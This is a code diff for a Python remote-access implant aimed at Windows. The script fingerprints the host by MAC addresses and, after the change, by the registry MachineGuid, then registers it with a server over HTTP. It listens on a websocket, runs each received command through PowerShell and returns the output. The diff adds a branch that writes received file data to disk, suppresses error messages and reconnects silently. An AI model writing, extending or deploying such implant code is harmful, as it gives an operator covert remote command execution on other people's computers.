@@ -22,10 +22,15 @@ signal.signal(signal.SIGINT, def_handler)
 #        CREATE_NO_WINDOW = 0X00000000
 #        subprocess.Popen
 
-def cmo(cmd):
-    result=subprocess.run(f"powershell.exe -c {cmd}", capture_output=True, text=True)
-    return result.stdout, result.stderr
 
+def cmo(cmd):
+    # Escapar comillas dobles para PowerShell
+    escaped_cmd = cmd.replace('"', '`"')  # backtick para escapar en PowerShell
+    result = subprocess.run(
+        ['powershell.exe', '-Command', escaped_cmd],
+        capture_output=True, text=True
+    )
+    return result.stdout, result.stderr
 
 def get_macs():
     macs_output, err = cmo("Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress")
@@ -63,11 +68,7 @@ def get_operating_system():
     
 
 def impl_id():
-    id=""
-    for mac in get_macs():
-        id=id+mac
-    return id.replace('-','')
-
+    return  str( cmo("(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid).MachineGuid")[0]).replace('\\n', '').strip()
 
 def register():
     maclist = get_macs()
@@ -84,8 +85,9 @@ def register():
         'impl_id':impl_id()
     }
 
+    req=requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
 
-async def recibe():
+async def receive():
 
     register()
 
@@ -97,10 +99,10 @@ async def recibe():
             try:
                 while True:
                     cmd = await ws.recv()
-                    if cmd and cmd != "undefined":
-                        try:
+                    data = json.loads(cmd.replace("'", '"'))
 
-                            data = json.loads(cmd.replace("'", '"'))
+                    if 'cmd' in data:
+                        try:
                             out, err = cmo(data["cmd"])
 
                             #print(f" {data["cmd"]}")
@@ -112,22 +114,28 @@ async def recibe():
                                 await ws.send(err)
                         
                         except json.JSONDecodeError as e:
-                            asyncio.sleep(5)
+                            await asyncio.sleep(5)
                             #print(f"JSON inválido: {e}")
                         except Exception as e:
-                            asyncio.sleep(5)
+                            await asyncio.sleep(5)
                             #print(f"Error procesando el comando: {e}")
+                    elif 'file' in data:
+                        print(data['file'])
+                        OUTPUT_FILE = 'archivo_recibido.txt'
+                        with open(OUTPUT_FILE, 'a') as f:
+                            f.write(data['file'])
+                            print("Transferencia finalizada.")
 
             except ConnectionClosedError as e:
                 #print(f"[!] Conexión cerrada: {e}. Reintentando en 5 segundos...")
-                asyncio.sleep(5)
+                await asyncio.sleep(5)
             except Exception as e:
                 #print(f"[!] Error inesperado: {e}. Reintentando en 5 segundos...")
-                asyncio.sleep(5)
+                await asyncio.sleep(5)
 
 
     except Exception as e:
-        asyncio.sleep(5)
+        await asyncio.sleep(5)
         #print(f": {e}")
 
-asyncio.run( recibe() )
+asyncio.run( receive() )
